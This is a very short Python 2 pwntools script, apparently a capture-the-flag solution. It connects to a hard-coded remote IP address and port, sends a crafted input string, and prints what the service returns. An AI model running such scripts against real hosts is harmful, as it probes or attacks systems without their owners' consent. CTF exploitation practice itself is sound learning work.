#!/usr/bin/env python2

from pwn import *

r = remote("188.166.133.53",12037)
print r.recvuntil("\n")
r.sendline("ffffffffff\nAAAA/")
print r.recvall()
